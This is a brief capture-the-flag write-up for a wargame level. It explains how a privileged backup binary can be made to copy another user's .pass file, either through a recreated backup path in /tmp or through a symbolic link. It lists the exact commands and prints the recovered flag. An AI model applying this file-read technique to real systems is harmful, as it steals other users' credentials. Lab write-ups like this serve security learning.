HOW TO FIND THE FLAG:

After analysing the binary file and reverse engineered it we can see that the program is going to open the file given as a parameter and will backup in a backup directory.

As we don't have the permission on the backup directory in the home/users/level09/ path we are going to go in /tmp directory 

Then we create the same path in tmp backups/home/users/level09 and execute our binary file with parameter /home/users/level09/.pass

1. cd /tmp
2. mkdir -p backups/home/users/level09/
3. ~/level08 /home/users/level09/.pass
4. cat backups/home/users/level09/.pass

Another solution is to create a symbolic link

1. chmod +w .
2. ln -s /home/users/level09/.pass sympass
3 ./level08 sympass
4. cat backups/sympass

The flag is fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

su level09 -> fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
